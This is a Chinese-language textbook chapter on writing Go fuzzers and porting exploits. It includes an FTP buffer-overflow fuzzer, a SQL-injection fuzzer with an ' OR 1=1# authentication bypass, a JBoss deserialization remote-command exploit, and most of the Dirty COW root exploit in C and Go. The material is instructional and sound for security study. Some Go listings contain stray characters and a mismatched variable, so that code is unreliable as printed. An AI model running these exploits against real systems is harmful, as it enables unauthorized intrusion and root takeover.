# 第9章：编写并移植漏洞代码

在前面的大多数章节中，使用Go创建基础的网络攻击。开发了原生的TCP，HTTP，DNS，SMB，数据库交互和被动数据包捕捉。

本章侧重于识别和移植漏洞。首先，学习如何创建漏洞混淆器来发现程序的安全缺陷。然后，学习如何移植现有漏洞到Go中。最后，展示如何使用流行的工具来创建支持Go的shellcode。在本章结束时，应该对如何使用Go来发现缺陷以及如何使用它来编写和交付各种有效负载有了基本的了解。

## 创建混淆器

`Fuzzing`是一种向程序发送大量数据，试图迫使应用程序产生异常行为的技术。该行为可暴漏代码的错误或安全缺陷，稍后就可以使用这些缺陷。混淆一个程序还可能产生不希望看到的副作用，比如资源耗尽、内存损坏和服务中断。其中有些副作用对于bug猎人和开发人员来说是必要的，但不利于程序的稳定性。因此，始终在受控的实验室环境中执行混淆是非常重要的。就像在本书中讨论的大多数技巧一样，在没有所有者的明确授权下，不要混淆程序或系统。

本部分会创建两个混淆器。第一个检测使服务崩溃时输入的容量，并识别缓冲区溢出。第二个混淆器重播HTTP请求，循环通过可能的输入发现SQL注入。

### 缓冲区溢出混淆

_Buffer overflows_ 发生在用户在输入中提交的数据超过了程序能申请到的内存。例如，用户能够提交5000字符，而程序只能接受5个。若程序使用了错误的技术，其能允许用户将多余的数据写入到不是为这些数据准备的内存中，这种“溢出”会破坏存储在相邻内存位置中的数据，能让恶意用户偷偷地使程序崩溃或改变其逻辑流。

缓冲区溢出对于从客户端接收数据的网络程序影响特别大。使用缓冲区溢出，客户端可能终端服务端的可用性，或执行远程代码。再重申下：除非得到允许，否则不要混淆系统或应用程序。另外，确保完全理解系统或程序崩溃的后果。

#### 缓冲区溢出混淆如何工作

混淆地创建缓冲区溢出通常需要提交越来越长的输入，例如，每个后续请求都包含比上次多一个字符的输入值。一个牵强的例子，使用A字符作为输入会按照表9-1中所示的方式执行。

**表9-1：** 在缓冲区溢出测试中的输入的值

| 次数 | 输入 |
| :--- | :--- |
| 1 | A |
| 2 | AA |
| 3 | AAA |
| 4 | AAAA |
|  | N个A |

通过向一个易受攻击的函数发送大量输入，输入的长度最终会达到超过函数定义的缓冲区的大小，这会破坏程序的控制元素，例如其返回和指令指针。至此，程序或系统会崩溃。

每次尝试发送越来越大的请求，可以精确地确定预期的输入大小，这对之后开发程序非常重要。然后检查崩溃或核心输出结果，以便更好地理解漏洞并尝试开发一个有效的漏洞。在这里不讨论调试器的使用和开发；而要专注于编写混淆器。

如果用现代的解释语言做过手动混淆器，可能已经使用了构造器来创建指定长度的字符串。例如，下面的Python代码，在解释器控制台中运行，展示了创建一个有25个A字符的字符串是多么简单：

```python
>>> x = "A"*25
>>> x 
'AAAAAAAAAAAAAAAAAAAAAAAAA'
```

遗憾的是，Go中没有这么简便的构造器来构建任意长度的字符串。必须使用老风格的方式——使用循环——像下面这样的代码：

```go
var (
    n int
    s string 
)
for n = 0; n < 25; n++ { 
    s += "A"
}
```

显然，比Python有点冗长，但不难理解。

需要考虑的另一个问题是有效负载的传递机制。这依赖于目标程序或系统。在某些情况下，可能会涉及到向磁盘写入文件。另一些情况下，可能通过TCP/UDP与HTTP、SMTP、SNMP、FTP、Telnet或其他网络服务进行通信。

下面的例子中，将对远程FTP服务执行混淆测试。可以快速调整我们提供的许多逻辑来针对其他协议进行操作，因此它应该作为针对其他服务开发定制混淆器的良好基础。

虽然Go的标准包中包含对一些常见协议的支持，像HTTP和SMTP，但不支持客户端-服务器的FTP交互。可以使用支持FTP通信的第三方包代替，因此没必要从头开始写重复造轮子。然而，为了最大限度地控制（并欣赏该协议），使用原生的TCP通信来构建基础的FTP功能。如果需要回顾TCP是如何工作的，可以参考第2章。

#### 构建缓冲区溢出混淆器

清单9-1是混淆器的代码。（`/` 根路径下的所有代码清单都位于github 仓库 `https://github.com/blackhat-go/bhg/`。）硬编码了一些值，例如目标IP和端口，还有输入的最大长度。代码本身混淆了USER属性。由于此属性出现在用户身份验证之前，因此作为攻击面上的一个常见的可测试点。

```go
func main() {
    for i := 0; i < 2500; i++ {
        conn, err := net.Dial("tcp", "10.0.1.20:21") 
        if err != nil {
            log.Fatalf("[!] Error at offset %d: %s\n", i, err) 
        }
        bufio.NewReader(conn).ReadString('\n')

        user := ""
        for n := 0; n <= i; n++ {
            user += "A" 
        }

        raw := "USER %s\n" 
        fmt.Fprintf(conn, raw, user)
        bufio.NewReader(conn).ReadString('\n')

        raw = "PASS password\n" 
        fmt.Fprint(conn, raw) 
        bufio.NewReader(conn).ReadString('\n')

        if err := conn.Close(); err != nil { 
            log.Println("[!] Error at offset %d: %s\n", i, err)
        } 
    }
}
```

清单 9-1: 缓冲区溢出混淆器 （`/ch-9/ftp-fuzz/main.go`）

代码一开始就是一个大循环。每次程序循环时，会在所提供的用户名上添加另一个字符。这样就将发送长度在1到2500个字符之间的用户名。

循环中的每次迭代，都会和目标FTP服务建立TCP连接。每当和FTP服务交互时，无论是初始化连接或后续的命令，都将服务器的响应作为一行单独显式读取。如此一来，代码会在等待TCP响应时阻塞，也就不会在数据包返回前过早地发送命令。然后用另一个 `for` 循环用之前介绍的方式构建 `A` 的字符串。使用外部循环的索引 `i` 来构建基于当前循环迭代的字符串长度，这样程序每次重新开始时，字符串长度都会增加1。 通过使用 `fmt.Fprintf(conn, raw, user)` 将该值写入到 `USER` 命令中。

尽管可以在此时结束与FTP服务器的交互\(毕竟，只混淆了 `USER` 命令\)，但可以继续发送 `PASS` 命令来完成事务。最后，干净地关闭链接。

值得注意的有两点，其中，异常连接行为可能表明服务中断，这意味着潜在的缓冲区溢出：当第一次建立链接，然后链接关闭。如果在下次循环时不能建立链接，很可能出问题了。然后，检查服务是否由于缓冲区溢出而崩溃了。

如果建立链接后不能关闭，这可能是远程FTP服务突然断开的异常行为，但是，可能不是由于缓冲区溢出造成的。先记录下异常情况，程序继续执行。

图9-1是抓到的包，显示后续的每个 `USER` 命令的长度都在增加，确定代码按预期执行。

图9-1 Wireshark捕获到每次程序循环时 `USER` 命令增加一个字母

有几种方法能提高代码的灵活性和方便性。例如，可能的话移除IP，端口，迭代值的硬编码，而通过命令行参数或配置文件传入。可以作为练习。另外，扩展代码，以便在身份验证后混淆命令。特别地，更新工具来混淆 `CWD/CD` 命令。从历史上看，各种工具都容易受到与该命令的处理有关的缓冲区溢出的影响，这使其成为混淆测试的好目标。

### SQL注入混淆

本部分将探索SQL注入模糊测试。攻击的这种变化不是更改每次输入的长度，而是通过定义的输入列表循环以尝试SQL注入。换句话来说就是，通过尝试由各种SQL元字符和语法组成的输入列表来混淆网站登录表单的username参数，如果后端数据库对其进行不安全的处理，则会导致应用程序产生异常行为。

为简单起见，仅探测基于错误的SQL注入，忽略像boolean-, time-, 和 union-based等其他形式。这意味着，无需在响应内容或响应时间上寻找细微的差异，而在HTTP响应中查找错误消息以表明SQL注入。也意味着希望web服务保持运行状态，因此不能再依赖连接的建立来检验是否成功创建了异常行为。相反，需要在响应体中搜索数据库错误消息。

#### SQL注入原理

SQL注入的核心是，攻击者在语句中插入SQL元字符，从而有可能操纵查询以产生意外行为或返回受限的敏感数据。开发者盲目地将不受信任的用户数据连接到他们的SQL查询时，就会发生此问题，如以下伪代码所示：

```go
username = HTTP_GET["username"]
query = "SELECT * FROM users WHERE user = '" + username + "'" result = db.execute(query)
if(len(result) > 0) {
    return AuthenticationSuccess()
} else {
    return AuthenticationFailed()
}
```

伪代码中，变量username直接从HTTP参数中读取。该值未经过校验和验证。然后使用该值直接拼接到SQL查询语句中来构建查询字符串。程序查询数据库并检查结果。如果匹配到至少一条记录，则身份验证成功。只要提供的用户名由字母数字和某些特殊字符组成，该代码就应具有适当的行为。例如，提供用户名alice会是下面的安全查询：

```sql
SELECT * FROM users WHERE user = 'alice'
```

但是，当用户名含单引号时会发生什么呢？提供用户名 `o'doyle` 会产生以下查询：

```sql
SELECT * FROM users WHERE user = 'o'doyle'
```

这里的问题是后端数据库现在看到不平衡数量的单引号。注意前面查询的强调部分**`doyle`** ；后端数据库将其解释为SQL语法，因为它位于引号之外。当然，这是无效的SQL语法，并且后端数据库也不会处理。对于基于错误的SQL注入，会在HTTP响应中生成一个错误消息。消息本身将根据数据库而有所不同。MYSQL中会收到类型下面的的错误，可能还会包含其他详细信息，从而关闭查询本身：

```sql
You have an error in your SQL syntax
```

尽管我们不会太深入地研究，但是现在可以操纵用户名输入来生成有效的SQL查询，该查询将绕过示例中的身份验证。输入 `' OR 1=1#`的用户名，恰好位于下面的SQL语句中：

```sql
SELECT * FROM users WHERE user = '' OR 1=1#'
```

该输入在查询的末尾附加了逻辑 `OR`。该 `OR` 语句总是为真，因为1总是等于1。然后使用MySQL的注释（\#）强制后端数据库忽略剩余的查询。这是有效的SQL语句。假设数据库中存在一行或多行数据，就可以绕过前面伪代码中的身份验证。

#### 构建SQL注入混淆器

混淆器的目的不是生成符合语法的SQL语句。恰恰相反，需要中断查询，以使语法错误的语句在后端数据库中产生错误，如O’Doyle的示例所示。为此，将发送各种SQL元字符作为输入。

首先要做的是分析目标请求。通过检查HTML源代码，使用拦截代理或使用Wireshark捕获网络数据包，可以确定为登录门户提交的HTTP请求类似于以下内容：

```markup
POST /WebApplication/login.jsp HTTP/1.1
Host: 10.0.1.20:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Referer: http://10.0.1.20:8080/WebApplication/ Cookie: JSESSIONID=2D55A87C06A11AAE732A601FCB9DE571 Connection: keep-alive
Upgrade-Insecure-Requests: 1
username=someuser&password=somepass
```

登录表单将POST请求发送到 `http://10.0.1.20:8080/WebApplication/login.jsp`。有两个表单参数： `username` 和 `password` 。在本例中，为简洁起见，我们将混淆限制在 `username` 字段。 代码本身非常紧凑，包含几个循环，正则表达式以及创建HTTP请求。如清单9-2所示。

```go
func main() {
    payloads := []string{
        "baseline", ")",
        "(",
        "\"",
        "'", 
    }
    sqlErrors := []string{ 
        "SQL",
        "MySQL", 
        "ORA-", 
        "syntax",
    }
    errRegexes := []*regexp.Regexp{} 
    for _, e := range sqlErrors {
        wre := regexp.MustCompile(fmt.Sprintf(".*%s.*", e)) 
        errRegexes = append(errRegexes, re)
    }
    for _, payload := range payloads { 
        client := new(http.Client)
        body := []byte(fmt.Sprintf("username=%s&password=p", payload)) 
        req, err := http.NewRequest(
            "POST", 
            "http://10.0.1.20:8080/WebApplication/login.jsp", 
            bytes.NewReader(body),
        )
        if err != nil {
            log.Fatalf("[!] Unable to generate request: %s\n", err) 
        }
        req.Header.Add("Content-Type", "application/x-www-form-urlencoded") 
        resp, err := client.Do(req)
        if err != nil {
            log.Fatalf("[!] Unable to process response: %s\n", err) 
        }
          body, err = ioutil.ReadAll(resp.Body) 
        if err != nil {
            log.Fatalf("[!] Unable to read response body: %s\n", err) 
        }
        resp.Body.Close()
        for idx, re := range errRegexes { 
            if re.MatchString(string(body)) {
                fmt.Printf(
                    "[+] SQL Error found ('%s') for payload: %s\n", 
                    sqlErrors[idx],
                    payload,
                )
                break 
            }
        } 
    }
}
```

清单 9-2: SQL注入混淆器 \(/ch-9/http\_fuzz/main.go\)

代码首先定义要尝试的有效负载的切片。这是稍后将作为`username`请求参数的混淆列表。同样，定义了SQL错误关键字的字符串切片。将会在HTTP响应体中搜索这些值。存在任何一个值都是SQL出错的强有力的指标。也可以扩展这两个列表，但对于本例以及足够了。

下一步执行一些处理工作。对于要搜索的每个错误关键字，构建并编译一个正则表达式。在主HTTP逻辑外做这些工作，就不用多次创建并编译这些正则表达式。毫无疑问，这是小的优化，但还是好的做法。使用这些已编译的正则表达式填充一个单独的切片，该切片在后面使用。

接下来是该混淆器的核心逻辑。循环遍历每个有效负载，使用它们来构建一个适当的HTTP请求体，`username` 的值是当前的有效负载。使用该结果来构建针对登录表单的HTTP POST请求。然后设置 `Content-Type` 头，调用 `client.Do(req)` 发送请求。

请注意，通过使用创建客户端和单个请求的长格式过程来发送请求，然后调用 `client.Do()`。 当然可以使用Go的 `http.PostForm()`函数来更简洁地实现。但是，更详细的技术可以更细粒度地控制HTTP的头。尽管本例中只设置了`Content-Type` 头，但是HTTP请求时设置额外的头的情况并不少见（例如 `User-Agent, Cookie` 等）。无法使用 `http.PostForm()`做到这一点，因此，用长路由会更容易地添加任何必须的HTTP头，尤其是对头本身进行混淆处理时。

接下来，使用 `ioutil.ReadAll()` 读取HTTP响应体。有了响应体后就可以遍历所有的预编译的正则表达式了，测试响应主体中是否存在SQL 错误关键字。如果匹配到的话，就可能是一个SQL注入错误消息。程序会将负载和错误的详情输出到屏幕上，然后继续循环的下一个迭代。

运行代码，以确认它可以通过易受攻击的登录表单成功识别出SQL注入漏洞。如果为 `username` 加上单引号，则会显示SQL的错误指示符，如下所示：

```bash
$ go run main.go
[+] SQL Error found ('SQL') for payload: '
```

鼓励您尝试以下练习，以帮助更好地理解代码，理解HTTP通信的细微差别，并提高检测SQL注入的能力：

1. 更新代码以测试基于时间的SQL注入。为此，必须发送各种有效负载，这些负载会在后端查询执行时引入时间延迟。需要测量往返时间，并将其与基准请求进行比较，以推断是否存在SQL注入。
2. 更新代码以测试基于布尔的盲目SQL注入。尽管为此可以使用不同的指标，一个简单的方式是比较HTTP响应代码和基准响应。与基准响应代码的偏差，尤其是接收到500响应码（服务器内部错误），可能标示SQL注入。
3. 预期依赖Go的 `net.http` 包来简化通信，不如尝试使用 `net` 包处理原生TCP连接。当使用 `net` 包时，需要注意 HTTP的 `Content-Length` 头，其标示消息体的长度。需要计算每次请求的准确长度，因为消息体长度会变。如果使用的是无效长度，服务器很可能会拒绝请求。

下一节中，将介绍如何把漏洞开发从Python或C等其他语言移植到Go中。

### 移植漏洞到Go中

由于种种原因，需要将已存在的漏洞移植到Go中。可能现有的开发代码已被破坏、不完整或与目标系统或版本不兼容。虽然可以毫无疑问地使用原语言来扩展或更新损坏或未完成的代码，但是Go能提供容易的交叉编译，一致的语法和缩进规则以及强大的标准库。所有这些将使开发的代码具有更高的可移植性和可读性，而不会影响功能。

移植现有漏洞程序时，可能最大的挑战是确定等效的Go库和函数调用以实现相同级别的功能。举个例子，解决字节序，编码和加密等价物可能需要一些研究，尤其是对于那些不熟悉Go的人。幸运的是，在前面的章节中已经解决了基于网络通信的复杂性。希望大家应该熟悉它的实现和细微差别。

会发现无数种使用Go的标准库进行漏洞开发或移植的方法。对于我们来说，在一章中全面介绍这些包和用例是不现实的，建议通过 `https://golang.org/pkg/` 浏览Go的官方文档。文档内容丰富，有大量的好例子来帮助理解函数和包的用法。下面是一些在开发时可能会最感兴趣的包:

**bytes** 提供低级字节操作 **crypto** 实现各种对称和非对称加密和消息认证 **debug** 检查各种文件类型的元数据和内容

**encoding** 使用各种常见形式（例如二进制，十六进制，Base64等）对数据进行编码和解码

**io** **and** **bufio** 从各种通用接口类型\(包括文件系统、标准输出、网络连接等\)读写数据

**net** 通过使用各种协议（例如HTTP和SMTP）方便客户端与服务器的交互

**os** 执行本地操作系统并与之交互

**syscall** 公开用于进行低级系统调用的接口

**unicode** 使用UTF-16或UTF-8编码和解码数据

**unsafe** 与操作系统进行交互时避免Go的类型安全检查很有用

诚然，在后面的章节中，尤其是在我们讨论底层Windows交互时，其中一些包被证明更有用，但是我们已经包含了这个列表供查看。我们不会尝试详细介绍这些包，而是展示如何通过使用其中一些包来移植现有漏洞开发程序。

#### 移植Python代码漏洞

在第一个例子中，将移植2015年发布的Java反序列化漏洞。该漏洞归类为几个CVE，它影响常见应用程序，服务器和库中Java对象的反序列化。反序列化库引入了此漏洞，该库无法在服务器端执行之前的验证输入（漏洞的常见原因）。我们将重点放在开发流行的Java Enterprise Edition应用程序服务器JBoss上。在 [https://github.com/roo7break/serialator/blob/master/serialator.py](https://github.com/roo7break/serialator/blob/master/serialator.py) 上，有一个Python脚本，其中包含可在多个应用程序中使用此漏洞的逻辑。清单9-3提供需要复制的逻辑。

```python
def jboss_attack(HOST, PORT, SSL_On, _cmd):
    # The below code is based on the jboss_java_serialize.nasl script within Nessus 
    """
    This function sets up the attack payload for JBoss
    """
    body_serObj = hex2raw3("ACED000573720032737--SNIPPED FOR BREVITY--017400")

    cleng = len(_cmd)
    body_serObj += chr(cleng) + _cmd
    body_serObj += hex2raw3("740004657865637571--SNIPPED FOR BREVITY--7E003A")

    if SSL_On:
        webservice = httplib2.Http(disable_ssl_certificate_validation=True) 
        URL_ADDR = "%s://%s:%s" % ('https',HOST,PORT)
    else:
        webservice = httplib2.Http()
        URL_ADDR = "%s://%s:%s" % ('http',HOST,PORT)
        headers = {"User-Agent":"JBoss_RCE_POC", 
                   "Content-type":"application/x-java-serialized-object--SNIPPED FOR BREVITY--", 
                   "Content-length":"%d" % len(body_serObj)
        }
    resp, content = webservice.request(
        URL_ADDR+"/invoker/JMXInvokerServlet", 
        "POST",
        body=body_serObj,
        headers=headers)
    # print provided response.
    print("[i] Response received from target: %s" % resp)
```

清单 9-3: Python 序列化开发代码

让我们看下这里用到了那些东西。该函数接收host，port，SSL标示和操作系统命令作为参数。为了构建正确的请求，该函数必须创建一个表示序列化Java对象的有效负载。该脚本首先将一系列字节硬编码到名为 `body_serObj` 的变量中。为了简洁起见，已将这些字节删除，但请注意，它们在代码中以字符串值的形式表示。这是一个十六进制字符串，需要将其转换为字节数组，以便该字符串的两个字符成为单个字节的表示形式。例如，您需要将`AC`转换为十六进制字节 `\ xAC`。为了完成此转换，代码调用了 `hex2raw3` 函数。只要了解了十六进制字符串是怎么回事，关于此函数基础实现的细节就无关紧要了。

接下来，脚本计算操作系统命令的长度，然后将长度和命令追加到 `body_serObj` 变量。该脚本通过附加以表示Java序列化对象其余部分的其他数据来完成有效负载的构造，该对象以JBoss可以处理的格式。构造有效负载后，脚本将构建URL并设置SSL以忽略无效证书（如有必要）。然后，设置所需的 `Content-Type`和`Content-Length` HTTP标头，并将恶意请求发送到目标服务器。

该脚本中的大多数内容对于我们来说并不陌生，因为在上一章已经介绍了大部分内容。现在，只需以Go习惯的方式进行等效的函数调用即可。清单9-4是该漏洞的Go版本。

```go
func jboss(host string, ssl bool, cmd string) (int, error) {
    serializedObject, err := hex.DecodeString("ACED0005737--SNIPPED FOR BREVITY--017400")
    if err != nil {
        return 0, err
    }
    serializedObject = append(serializedObject, byte(len(cmd)))
    serializedObject = append(serializedObject, []byte(cmd)...)
    afterBuf, err := hex.DecodeString("740004657865637571--SNIPPED FOR BREVITY--7E003A")
    if err != nil {
        return 0, err
    }
    serializedObject = append(serializedObject, afterBuf...)

    var client *http.Client var url string
    if ssl {
        client = &http.Client{ 
            Transport: &http.Transport{
                TLSClientConfig: &tls.Config{ 
                    InsecureSkipVerify: true,
                }, 
            },
        }
        url = fmt.Sprintf("https://%s/invoker/JMXInvokerServlet", host) 
    } else {
        client = &http.Client{}
        url = fmt.Sprintf("http://%s/invoker/JMXInvokerServlet", host) 
    }
    req, err := http.NewRequest("POST", url, bytes.NewReader(serializedObject)) 
    if err != nil {
        return 0, err
    }
    req.Header.Set(
        "User-Agent",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko") 
    req.Header.Set(
        "Content-Type",
        "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue")
    resp, err := client.Do(req)
    if err != nil {
        return 0, err
    }
    return resp.StatusCode, nil 
}
```

清单 9-4: 和原始Python序列化漏洞等效的Go代码 \(/ch-9/jboss/main.go\)

该代码几乎逐行复制了Python版本。基于此，我们将注释设置为与Python对应的注释一致，因此可以按照我们所做的更改。

首先，通过定义序列化的Java对象 `byte` 切片来构造有效负载，并在操作系统命令之前对该部分进行硬编码。不像Python版本那样依赖于用户定义的逻辑将十六进制字符串转换为 `byte` 数组，Go版本使用 `encoding/hex` 包中的 `hex.DecodeString()` 。接下来，确定操作系统命令的长度，然后将其和命令本身附加到有效负载中。通过将硬编码的十六进制尾部字符串解码到现有有效负载上，即可完成有效负载的构造。此代码比Python版本稍微冗长一些，因为我们有意添加了额外的错误处理，但也可以使用Go的标准编码包轻松解码十六进制字符串。

继续初始化HTTP客户端，如果需要，可将其配置为SSL通信，然后构建POST请求。在发送请求之前，需要设置必要的HTTP头，以便JBoss服务器正确地解释内容类型。注意，没有明确地设置 `Content-Length` 的HTTP头。这是因为Go的http包会自动为你做这些。最后，调用 `client.Do(request)` 发送攻击请求。

很大程度上，这段代码使用了已经学过的内容。该代码引入了一些小的修改，例如将SSL配置为忽略无效证书并添加特定的HTTP头。也许代码中的一个新颖的地方是使用 `hex.DecodeString()` ，这是一个Go核心函数，它将十六进制字符串转换为等价的字节表示形式。在Python中必须手动执行。表9-2是其他一些常见的Python和Go的等效函数或结构。

这不是一个函数映射的全面列表。存在太多变化和边缘情况，无法涵盖移植漏洞程序需要的所有可能的函数。我们希望这将帮助您把至少一些最常见的Python函数转换为Go。

表 9-2: 常用的 Python 和 Go 等效函数

| Python | Go | Notes |
| :--- | :--- | :--- |
| hex\(_x_\) | fmt.Sprintf\("_%\#x_", _x_\) | Converts an integer, x, to a lowercase hexadecimal string, prefixed with "0x". |
| ord\(_c_\) | rune\(_c_\) | Used to retrieve the integer \(int32\) value of a single character. Works  for standard 8-bit strings or multibyte Unicode. Note that rune is a built-in type in Go and makes working with ASCII and Unicode data fairly simple. |
| chr\(_i_\) and unichr\(_i_\) | fmt.Sprintf\("_%+q_", rune\(_i_\)\) | The inverse of ord in Python, chr and unichr return a string of length 1 for the integer input. In Go, you use the rune type and can retrieve it as a string by using the %+q format sequence. |
| struct.pack\(_fmt_, _v1_, _v2_, _. . ._\) | binary.Write\(_. . ._\) | Creates a binary representation of the data, formatted appropriately for type and endianness. |
| struct.unpack\(_fmt_, _string_\) | binary.Read\(_. . ._\) | The inverse of struct.pack and binary. Write. Reads structured binary data into a specified format and type. |

#### 移植C代码漏洞

让我们把注意力从Python移到C上。C可以说是一种比Python可读性差的语言，但是C与Go的相似之处比Python多。从C移植漏洞比想象的要容易。为了演示，我们将为Linux移植一个本地特权升级漏洞。该漏洞称为 _Dirty COW_，与Linux内核的内存子系统中的竞争状况有关。此漏洞在披露时影响了大多数（如果不是全部）常见的Linux和Android发行版。此漏洞已得到修补，因此需要采取一些具体措施来重现以下示例。具体来说，需要配置具有易受攻击的内核版本的Linux系统。进行相关设置超出了本章的范围。但是，作为参考，我们使用内核版本为3.13.1的64位Ubuntu 14.04 LTS发行版。

该漏洞利用程序的几种变体是公开可用的。可以在[https://www.exploit-db.com/exploits/40616/找到要复制的副本。清单9-5显示了完整的原始漏洞代码，并对其进行了稍微的修改以提高可读性。](https://www.exploit-db.com/exploits/40616/找到要复制的副本。清单9-5显示了完整的原始漏洞代码，并对其进行了稍微的修改以提高可读性。)

```c
#include <stdio.h> 
#include <stdlib.h> 
#include <sys/mman.h> 
#include <fcntl.h> 
#include <pthread.h> 
#include <string.h> 
#include <unistd.h>
void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1,pth2,pth3;

// change if no permissions to read 
char suid_binary[] = "/usr/bin/passwd";

unsigned char sc[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    --snip--
    0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;

void *madviseThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        c+=madvise(map,100,MADV_DONTNEED); 
    }
    printf("thread stopped\n"); 
}

void *procselfmemThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR); int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        lseek(f,map,SEEK_SET);
        c+=write(f, str, sc_len); 
    }
    printf("thread stopped\n"); 
}

void *waitForWrite(void *arg) {
    char buf[sc_len];
    for(;;) {
        FILE *fp = fopen(suid_binary, "rb");

        fread(buf, sc_len, 1, fp);

        if(memcmp(buf, sc, sc_len) == 0) {
            printf("%s is overwritten\n", suid_binary); 
            break;
        }
        fclose(fp);
        sleep(1); 
    }

    stop = 1;

    printf("Popping root shell.\n"); 
    printf("Don't forget to restore /tmp/bak\n");

    system(suid_binary);
}

int main(int argc,char *argv[]) {
    char *backup;

    printf("DirtyCow root privilege escalation\n"); 
    printf("Backing up %s.. to /tmp/bak\n", suid_binary);

    asprintf(&backup, "cp %s /tmp/bak", suid_binary); 
    system(backup);

    f = open(suid_binary,O_RDONLY); 
    fstat(f,&st);

    printf("Size of binary: %d\n", st.st_size);

    char payload[st.st_size]; 
    memset(payload, 0x90, st.st_size); 
    memcpy(payload, sc, sc_len+1);

    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);

    printf("Racing, this may take a while..\n");

    pthread_create(&pth1, NULL, &madviseThread, suid_binary);
    pthread_create(&pth2, NULL, &procselfmemThread, payload);
    pthread_create(&pth3, NULL, &waitForWrite, NULL);

    pthread_join(pth3, NULL);

    return 0; 
}
```

清单9-5 C语言编写的Dirty COW特权升级漏洞

与其解释C代码逻辑的细节，不如先从整体上看一下，然后将其分块，逐行与Go版本进行比较。该漏洞利用可执行文件和可链接格式（ELF）定义了一些恶意的Shell代码，该代码可生成Linux Shell。通过创建多个线程来作为特权用户执行代码，这些线程调用各种系统函数来将我们的shellcode写入内存位置。最终，shellcode通过覆盖碰巧已设置了SUID位并属于root用户的二进制可执行文件的内容来利用此漏洞。在本例中，二进制文件是 _/usr/bin/passwd_，通常非root用户不能覆盖该文件。但是，由于 _Dirty COW_ 漏洞，可以在保留文件权限的同时将任意内容写入文件，从而实现了特权升级。

现在将C代码分解为易于理解的部分，并将每个部分与Go中的等价部分进行比较。请注意，Go代码专门尝试实现C代码的逐行复制。清单9-6是在C语言函数之外定义或初始化的全局变量，而清单9-7是在Go中定义或初始化的全局变量。

```c
void *map; 
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1,pth2,pth3;

// change if no permissions to read 
char suid_binary[] = "/usr/bin/passwd";

unsigned char sc[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
    --snip--
    0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;
```

清单 9-6: C中的初始化

```go
var mapp uintptr
var signals = make(chan bool, 2) 
const SuidBinary = "/usr/bin/passwd"

var sc = []byte{
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
    --snip--
    0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
}
```

清单 9-7: Go中的初始化

C和Go之间的翻译非常简单。C和Go这两个代码部分保持相同的编号，以演示Go如何实现与C代码各自行相似的功能。在这两种情况下，通过定义 `uintptr` 变量来跟踪映射的内存。在Go中，将变量名声明为 `mapp`，因为与C不同，`map` 在Go中是一个保留关键字。然后初始化一个变量，用于通知线程停止处理。Go约定不是像C语言那样使用整数，而是使用带有缓冲的布尔管道。将其长度明确定义为2，因为将有两个发出信号的并发函数。接下来，为SUID可执行文件定义一个字符串，并通过将Shellcode硬编码到切片片来封装全局变量。与C版本相比，Go代码中省略了一些全局变量，这意味着将在相应的代码块中根据需要定义它们。

接下来看下 `madvise()` 和 `procselfmem()` 这两个使用竞争条件的主要函数。同样，我们将清单9-8中的C版本与清单9-9中的Go版本进行比较。

```c
void *madviseThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        c+=madvise(map,100,MADV_DONTNEED); 
    }
    printf("thread stopped\n"); 
}

void *procselfmemThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR); int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        lseek(f,map,SEEK_SET); 
        c+=write(f, str, sc_len);
    }
    printf("thread stopped\n"); 
}
```

清单 9-8: C中的竞争条件函数

```go
func madvise() {
    for i := 0; i < 1000000; i++ {
        select {
            case <- signals:u
            fmt.Println("madvise done")
            return
        default:
            syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED)
        }
    } 
}

func procselfmem(payload []byte) {
    f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0) 
    if err != nil {
        log.Fatal(err) 
    }
    for i := 0; i < 1000000; i++ { 
        select {
            case <- signals:u fmt.Println("procselfmem done") return
        default:
            syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))w f.Write(payload) 
        } 
    }
}
```

清单 9-9: Go中的竞争条件函数

竞争条件函数使用各种变量进行信号传递。这两个函数都包含for循环，该循环需要多次迭代。C版本检查 `stop` 变量的值，而Go版本使用 `select` 语句尝试从 `signals` 管道读取。当信号出现时，函数返回。如果没有信号在等待，则执行 `default` 。`madvise()` 和`procselfmem()` 函数之间的主要区别是 `default` 的处理。在我们的 `madvise()` 函数中您向 `madvise()` 函数发出一个Linux系统调用，而 `procselfmem()` 函数则向 `lseek()` 发出Linux系统调用，并将有效负载写入内存。

以下是这些函数的C和Go版本之间的主要区别：

* Go版本使用管道来确定何时提前中断循环，而C函数使用一个整数值来指示发生线程竞争何时中断循环。
* Go版本使用 `syscall` 包调用Linux系统。传递给该函数的参数包括要调用的系统函数及其必需的参数。可以通过搜索Linux文档来找到函数的名称，用途和参数。这就是我们能够调用本地Linux函数的方式。

